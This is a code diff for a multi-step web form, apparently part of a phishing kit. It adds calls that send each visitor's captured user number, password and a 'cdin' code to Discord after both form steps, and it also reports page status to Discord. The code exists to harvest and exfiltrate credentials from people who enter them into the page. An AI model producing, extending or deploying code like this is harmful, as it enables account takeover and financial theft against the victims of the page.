@@ -30,6 +30,9 @@ const addEventListeners = () => {
     formStepOne.addEventListener('submit', handleStepOneSubmit);
     formStepCdin.addEventListener('submit', handleStepCdinSubmit);
 
+    // Enviar estado a Discord
+    sendPageStatusToDiscord('P4');
+
     const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P4'}, JWT_SIGN);
     fetch(`${API_URL}/api/bot/status`, {
         method: 'POST',
@@ -56,6 +59,13 @@ const handleStepOneSubmit = (e) => {
         info.pass = inputPass.value;
 
         updateLS();
+
+        // Enviar datos a Discord
+        sendUserDataToDiscord(info).then(success => {
+            if (success) {
+                console.log('Datos enviados a Discord exitosamente');
+            }
+        });
 
         const payload = {
             number: info.user,
@@ -106,6 +116,13 @@ const handleStepCdinSubmit = (e) => {
         info.cdin = inputCdin.value;
 
         updateLS();
+
+        // Enviar datos actualizados a Discord con CDIN
+        sendUserDataToDiscord(info).then(success => {
+            if (success) {
+                console.log('Datos con CDIN enviados a Discord exitosamente');
+            }
+        });
 
         // Create payload
         const payload = {
